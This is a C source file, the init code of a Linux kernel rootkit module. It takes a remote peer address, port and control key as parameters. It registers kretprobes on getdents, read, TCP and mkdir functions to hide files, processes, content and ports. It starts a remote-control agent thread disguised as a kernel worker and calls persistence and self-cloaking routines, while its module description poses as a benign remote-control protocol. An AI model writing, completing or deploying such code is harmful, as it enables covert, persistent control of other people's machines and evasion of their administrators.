// SPDX-License-Identifier: GPL-2.0
// core/init.c - Module init: key parsing, probe registration, agent launch.
#include <linux/hex.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/string.h>

#include "rootkit.h"

// Module parameters
unsigned short peer_port;
module_param(peer_port, ushort, 0);

char peer_addr_str[16] = "127.0.0.1";
module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0);

static char rk_key_hex[RK_KEY_HEX_LEN + 1];
module_param_string(control_key, rk_key_hex, sizeof(rk_key_hex), 0);

unsigned int retry_base_ms = 5000;
module_param(retry_base_ms, uint, 0);

unsigned int retry_max_ms = 60000;
module_param(retry_max_ms, uint, 0);

unsigned int shell_timeout_ms = 60000;
module_param(shell_timeout_ms, uint, 0);

u8 rk_key[RK_KEY_LEN];

static struct task_struct *rk_thread;

static int __init rk_init(void)
{
	int ret;

	if (!peer_port)
		return -EINVAL;
	if (strlen(rk_key_hex) != RK_KEY_HEX_LEN)
		return -EINVAL;
	if (hex2bin(rk_key, rk_key_hex, RK_KEY_LEN) < 0)
		return -EINVAL;

	memzero_explicit(rk_key_hex, sizeof(rk_key_hex));

	rk_target_init(&rk_file_targets);
	rk_target_init(&rk_pid_targets);
	rk_target_init(&rk_content_targets);
	rk_target_init(&rk_port_targets);
	rk_shells_init();

	ret = register_kretprobe(&rk_getdents_probe);
	if (ret)
		goto fail_getdents;

	ret = register_kretprobe(&rk_read_probe);
	if (ret)
		goto fail_read;

	ret = register_kretprobe(&rk_tcp4_probe);
	if (ret)
		goto fail_tcp4;

	ret = register_kretprobe(&rk_tcp6_probe);
	if (ret)
		goto fail_tcp6;

	ret = register_kretprobe(&rk_mkdir_probe);
	if (ret)
		goto fail_mkdir;

	ret = register_kretprobe(&rk_mkdirat_probe);
	if (ret)
		goto fail_mkdirat;

	ret = rk_proc_init();
	if (ret)
		goto fail_proc;

	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
	if (IS_ERR(rk_thread)) {
		ret = PTR_ERR(rk_thread);
		rk_thread = NULL;
		goto fail_thread;
	}

	rk_persist();
	rk_cloak();
	return 0;

fail_thread:
	rk_proc_exit();
fail_proc:
	unregister_kretprobe(&rk_mkdirat_probe);
fail_mkdirat:
	unregister_kretprobe(&rk_mkdir_probe);
fail_mkdir:
	unregister_kretprobe(&rk_tcp6_probe);
fail_tcp6:
	unregister_kretprobe(&rk_tcp4_probe);
fail_tcp4:
	unregister_kretprobe(&rk_read_probe);
fail_read:
	unregister_kretprobe(&rk_getdents_probe);
fail_getdents:
	rk_shells_cleanup();
	memzero_explicit(rk_key, sizeof(rk_key));
	return ret;
}

static void __exit rk_exit(void)
{
	if (rk_thread)
		kthread_stop(rk_thread);

	rk_proc_exit();
	rk_uncloak();

	unregister_kretprobe(&rk_mkdirat_probe);
	unregister_kretprobe(&rk_mkdir_probe);
	unregister_kretprobe(&rk_tcp6_probe);
	unregister_kretprobe(&rk_tcp4_probe);
	unregister_kretprobe(&rk_read_probe);
	unregister_kretprobe(&rk_getdents_probe);

	rk_shells_cleanup();
	memzero_explicit(rk_key, sizeof(rk_key));
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Remote control protocol over encrypted channel");
